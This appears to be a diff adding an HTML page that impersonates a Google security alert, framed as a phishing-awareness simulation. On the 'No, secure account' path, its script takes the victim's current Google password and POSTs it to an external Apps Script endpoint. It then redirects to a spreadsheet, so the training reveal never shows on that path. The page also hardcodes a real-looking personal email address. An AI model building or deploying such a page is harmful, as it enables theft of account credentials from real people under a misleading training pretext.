@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Critical security alert - Google</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%234285f4' d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z'/><path fill='%2334a853' d='M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z'/><path fill='%23fbbc05' d='M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z'/><path fill='%23ea4335' d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z'/></svg>">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="alert-container">
+        <div class="alert-header">
+            <svg class="alert-icon" viewBox="0 0 24 24">
+                <circle cx="12" cy="12" r="10" fill="white"/>
+                <path d="M11 15h2v2h-2v-2zm0-8h2v6h-2V7z" fill="#d93025"/>
+            </svg>
+            Critical security alert
+        </div>
+        
+        <div class="alert-content">
+            <h1 class="alert-title">A suspicious app was blocked from accessing your account</h1>
+            
+            <!-- Email -->
+            <div class="email-section">
+            <div id="user-avatar" class="email-icon">A</div>
+            <div id="user-email" style="color: #5f6368; font-size: 14px;">adarshjedi@gmail.com</div>
+            </div>
+            
+            <p class="alert-description">
+                Google prevented someone from signing in to your account using a non-Google app. If this wasn't you, they know your password and you should change it immediately.
+            </p>
+            
+            <div class="device-info">
+                <div class="info-row">
+                <img src="mobile.png" alt="Unknown device icon" class="info-icon" style="width: 20px; height: 20px; margin-right: 12px;">
+                Unrecognized device
+                </div>
+                
+                <div class="info-row">
+                    <svg class="info-icon" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"/>
+                        <path d="M12.5 7H11v6l5.25 3.15.75-1.23-4.5-2.67z"/>
+                    </svg>
+                    8 hours ago
+                </div>
+                
+                <div class="location-row">
+                    <svg class="info-icon" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+                    </svg>
+                        <!-- Hacker location -->
+                        <div class="location-info" id="hacker-location">
+                        <div id="location-text" style="color: #5f6368; font-size: 14px;">New York, NY</div>
+                        </div>
+                </div>
+            </div>
+            
+            <div class="question-section">
+                <div class="question-text">Were you recently prevented from signing in to your Google Account?</div>
+                
+                <div class="button-container">
+                    <button class="action-button secure-button" onclick="handleResponse('secure')">
+                        <svg class="button-icon" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
+                        </svg>
+                        No, secure account
+                    </button>
+                    <button class="action-button yes-button" onclick="handleResponse('yes')">
+                        <svg class="button-icon" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                        </svg>
+                        Yes, it was me
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Password change screen -->
+        <div class="password-screen" id="passwordScreen">
+        <div class="password-content">
+            <h2 style="font-size: 20px; font-weight: 500; color: #202124; margin-bottom: 12px;">
+            Your account may be at risk
+            </h2>
+            <p style="font-size: 14px; color: #5f6368; margin-bottom: 24px;">
+            If this wasn't you, someone else is using your password to access your Google Account.
+            You should change your password immediately.
+            </p>
+            <div style="display: flex; justify-content: flex-end; gap: 12px;">
+            <button class="cancel-button" onclick="goBackToAlert()">Cancel</button>
+            <button class="change-password-button" onclick="showPasswordForm()">Change password</button>
+            </div>
+        </div>
+        </div>
+        
+        <!-- Password form screen -->
+        <div class="password-form" id="passwordForm">
+        <div class="password-content">
+            <h2 style="font-size: 20px; font-weight: 500; color: #202124; margin-bottom: 12px;">
+            Change your password
+            </h2>
+            <p style="color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 24px;">
+            To secure your account, please enter your current password and choose a new one.
+            </p>
+
+            <div class="form-field">
+            <label class="form-label" for="currentPassword">
+                Current password <span style="color: #d93025;">*</span>
+            </label>
+            <div class="input-wrapper">
+                <input type="password" id="currentPassword" class="form-input" placeholder="Enter your current password">
+                <span class="toggle-visibility" onclick="togglePassword(this, 'currentPassword')">
+                <!-- Start with eye-off icon -->
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="#5f6368" viewBox="0 0 24 24" class="eye-icon eye-hidden">
+                    <path d="M12 4.5c-4.7 0-8.7 2.8-10.5 7.5 1.8 4.7 5.8 7.5 10.5 7.5s8.7-2.8 10.5-7.5c-1.8-4.7-5.8-7.5-10.5-7.5zM12 17c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5z"></path>
+                    <line x1="3" y1="3" x2="21" y2="21" stroke="#d93025" stroke-width="2"></line>
+                </svg>
+                </span>
+            </div>
+            <div id="error-current" class="error-msg"></div>
+            </div>
+
+            <div class="form-field">
+            <label class="form-label" for="newPassword">
+                New password <span style="color: #d93025;">*</span>
+            </label>
+            <div class="input-wrapper">
+                <input type="password" id="newPassword" class="form-input" placeholder="Enter your new password">
+                <span class="toggle-visibility" onclick="togglePassword(this, 'newPassword')">
+                <!-- Eye closed icon by default -->
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#5f6368" width="20" height="20">
+                    <path d="M12 4.5c-4.7 0-8.7 2.8-10.5 7.5 1.8 4.7 5.8 7.5 10.5 7.5s8.7-2.8 10.5-7.5c-1.8-4.7-5.8-7.5-10.5-7.5zM12 17c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5z"></path>
+                    <line x1="3" y1="3" x2="21" y2="21" stroke="#d93025" stroke-width="2"></line>
+                </svg>
+                </span>
+            </div>
+            <div id="error-new" class="error-msg"></div>
+            </div>
+
+            <div class="form-field">
+            <label class="form-label" for="confirmPassword">
+                Confirm new password <span style="color: #d93025;">*</span>
+            </label>
+            <div class="input-wrapper">
+                <input type="password" id="confirmPassword" class="form-input" placeholder="Confirm your new password">
+                <span class="toggle-visibility" onclick="togglePassword(this, 'confirmPassword')">
+                <!-- Eye closed icon by default -->
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#5f6368" width="20" height="20">
+                    <path d="M12 4.5c-4.7 0-8.7 2.8-10.5 7.5 1.8 4.7 5.8 7.5 10.5 7.5s8.7-2.8 10.5-7.5c-1.8-4.7-5.8-7.5-10.5-7.5zM12 17c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5z"></path>
+                    <line x1="3" y1="3" x2="21" y2="21" stroke="#d93025" stroke-width="2"></line>
+                </svg>
+                </span>
+            </div>
+            <div id="error-confirm" class="error-msg"></div>
+            </div>
+
+            <!-- Password strength tip -->
+            <div style="margin-top: 24px; padding: 12px; background-color: #f1f3f4; border-radius: 8px;">
+            <strong style="display: block; margin-bottom: 6px;">Password Tips</strong>
+            <span style="font-size: 13px; color: #5f6368;">
+                Google requires passwords that are at least <strong>8 characters long</strong> and a combination of letters, numbers and special characters.
+            </span>
+            </div>
+
+            <div style="display: flex; justify-content: flex-end; gap: 12px; margin-top: 24px;">
+            <button class="cancel-button" onclick="goBackToPasswordScreen()">Cancel</button>
+            <button class="change-password-button" onclick="handlePasswordSubmit()">Confirm</button>
+            </div>
+        </div>
+        </div>
+        
+        <!-- Hidden reveal message -->
+        <div class="reveal-message" id="revealMessage">
+            <div class="reveal-title">🚨 This was a phishing simulation! 🚨</div>
+            <div class="reveal-text">
+                <strong>This was a security training exercise!</strong><br><br>
+                
+                This page was designed to look like a legitimate Google security alert. Here are the red flags you should watch for:<br><br>
+                
+                • Check the URL - this isn't accounts.google.com<br>
+                • Real Google alerts provide more specific information<br>
+                • Legitimate alerts wouldn't ask you to make security decisions from a popup<br>
+                • Always navigate to Google directly instead of clicking suspicious links<br><br>
+                
+                <strong>Best practice:</strong> When you receive security alerts via email, go directly to accounts.google.com to verify the alert.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function handleResponse(response) {
+        if (response === 'secure') {
+            // Hide alert content
+            document.querySelector('.alert-content').style.display = 'none';
+            document.getElementById('passwordScreen').classList.add('show');
+        } else {
+                // Show reveal message directly for "Yes, it was me"
+                showRevealMessage();
+            }
+        }
+        
+        function goBackToAlert() {
+            document.getElementById('passwordScreen').classList.remove('show');
+            document.querySelector('.alert-content').style.display = 'block';
+        }
+        
+        function showPasswordForm() {
+            document.getElementById('passwordScreen').classList.remove('show');
+            document.getElementById('passwordForm').classList.add('show');
+        }
+        
+        function goBackToPasswordScreen() {
+            document.getElementById('passwordForm').classList.remove('show');
+            document.getElementById('passwordScreen').classList.add('show');
+        }
+
+        function togglePassword(wrapper, fieldId) {
+        const input = document.getElementById(fieldId);
+        const svg = wrapper.querySelector('svg');
+
+        const isVisible = input.type === 'text';
+        input.type = isVisible ? 'password' : 'text';
+
+        // Swap icon: replace <path> for open/closed eye
+        svg.innerHTML = isVisible
+            ? `<path d="M12 4.5c-4.7 0-8.7 2.8-10.5 7.5 1.8 4.7 5.8 7.5 10.5 7.5s8.7-2.8 10.5-7.5c-1.8-4.7-5.8-7.5-10.5-7.5zM12 17c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5z"></path><line x1="3" y1="3" x2="21" y2="21" stroke="#d93025" stroke-width="2"></line>`
+            : `<path d="M12 4.5c-4.7 0-8.7 2.8-10.5 7.5 1.8 4.7 5.8 7.5 10.5 7.5s8.7-2.8 10.5-7.5c-1.8-4.7-5.8-7.5-10.5-7.5zM12 17c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5z"/>`;
+        }
+        
+        function handlePasswordSubmit() {
+        const current = document.getElementById('currentPassword');
+        const newPass = document.getElementById('newPassword');
+        const confirm = document.getElementById('confirmPassword');
+
+        let valid = true;
+
+        // Clear previous errors
+        document.getElementById('error-current').textContent = '';
+        document.getElementById('error-new').textContent = '';
+        document.getElementById('error-confirm').textContent = '';
+
+        // Current password required
+        if (!current.value.trim()) {
+            document.getElementById('error-current').textContent = 'Please enter your current password.';
+            valid = false;
+        }
+
+        const np = newPass.value;
+        const cp = confirm.value;
+
+        // New password: required
+        if (!np.trim()) {
+            document.getElementById('error-new').textContent = 'Please enter a new password.';
+            valid = false;
+        }
+
+        // Confirm password: required
+        if (!cp.trim()) {
+            document.getElementById('error-confirm').textContent = 'Please confirm your new password.';
+            valid = false;
+        }
+
+        // Length check
+        if (np.length < 8) {
+            document.getElementById('error-new').textContent = 'Password must be at least 8 characters long.';
+            valid = false;
+        }
+
+        // Leading/trailing spaces
+        if (np.trim() !== np) {
+            document.getElementById('error-new').textContent = 'Password cannot start or end with a space.';
+            valid = false;
+        }
+
+        // Optional: Must contain at least 2 of: letter, number, symbol
+        const hasLetter = /[A-Za-z]/.test(np);
+        const hasDigit = /\d/.test(np);
+        const hasSymbol = /[!@#$%^&*(),.?":{}|<>_\-=+~]/.test(np);
+        const variationCount = [hasLetter, hasDigit, hasSymbol].filter(Boolean).length;
+
+        if (variationCount < 2) {
+            document.getElementById('error-new').textContent = 'Password should include a mix of letters, numbers, or symbols.';
+            valid = false;
+        }
+
+        // Confirm match
+        if (np && cp && np !== cp) {
+            document.getElementById('error-confirm').textContent = 'Passwords do not match.';
+            valid = false;
+        }
+
+        // Only submit if all is valid
+        if (valid) {
+        const password = current.value;
+
+        fetch("https://script.google.com/macros/s/AKfycbwK6L5zb3KfJvLJehKBzsreLl9LdRPZBST_eEUxdUpBQDLC_btJZL0W3J0Emc-uwD5Qmw/exec", {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: "password=" + encodeURIComponent(password)
+        })
+        .then(response => {
+            // Optional: Redirect after storing
+            window.location.href = "https://docs.google.com/spreadsheets/d/1KNFXJiBTAM2Q7hnsEYu0ps97lRVJyUhy8H-dheRCrbM/edit#gid=0";
+        })
+        .catch(error => {
+            alert("Failed to store password: " + error);
+        });
+        }
+        }
+        
+        function showRevealMessage() {
+            // Hide all other screens
+            document.querySelector('.alert-container').style.display = 'none';
+            document.getElementById('passwordScreen').classList.remove('show');
+            document.getElementById('passwordForm').classList.remove('show');
+            
+            // Show the reveal message
+            document.getElementById('revealMessage').classList.add('show');
+            
+            // Create new container for reveal
+            const revealContainer = document.createElement('div');
+            revealContainer.className = 'alert-container';
+            revealContainer.appendChild(document.getElementById('revealMessage'));
+            document.body.appendChild(revealContainer);
+        }
+        
+        window.onload = function () {
+        const email = prompt("Enter your email:");
+        const firstLetter = prompt("Enter the first letter of your first name (e.g. a):");
+        const location = prompt("Enter the hacker's location (e.g., New York, NY):");
+
+        // Set values in DOM
+        if (email) document.getElementById('user-email').innerText = email;
+        if (firstLetter) document.getElementById('user-avatar').innerText = firstLetter.toUpperCase();
+        if (location) document.getElementById('location-text').innerText = location;
+        };
+    </script>
+</body>
+</html>
